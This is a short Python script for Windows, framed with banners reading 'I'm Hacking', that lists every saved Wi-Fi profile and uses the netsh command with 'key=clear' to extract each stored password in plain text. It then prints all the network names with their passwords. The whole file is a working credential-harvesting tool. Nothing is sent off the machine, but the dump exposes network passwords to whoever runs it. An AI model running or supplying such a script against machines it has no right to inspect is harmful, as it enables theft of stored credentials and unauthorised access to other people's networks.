import os
import pyfiglet
import time


def regular_wifi():
    all_wifi = os.popen("netsh wlan show profile").readlines()
    profile_list = []
    for i in all_wifi:
        # print(i)
        name_wifi = i.replace("\n", "").replace(" ", "").split(":")
        # profile_list.append(i.replace("\n", ""))
        if len(name_wifi) == 2:
            if name_wifi[1] == "":
                continue
            profile_list.append(name_wifi[1])
    
    return profile_list


def looking_pws(name_wifi):
    all_wifi = []
    for name in name_wifi:
        pws_wifi = os.popen(f"netsh wlan show profile {name} key=clear | findstr Key").read().replace("\n", "").replace(" ", "").split(":")[-1]
        result_name_pws = f"WIfi name: {name} | Password: {pws_wifi}\n"
        # print(result_name_pws)
        all_wifi.append([name, pws_wifi])
        time.sleep(1)
    return all_wifi

if __name__ == '__main__':
    font_3d = "isometric1"
    pyfiglet.print_figlet(text="I'm Hacking", colors='GREEN')
    
    reg_name_wifi = regular_wifi()
    all_wifi = looking_pws(reg_name_wifi)
    print(all_wifi)

    pyfiglet.print_figlet(text="Success fully", colors='RED')


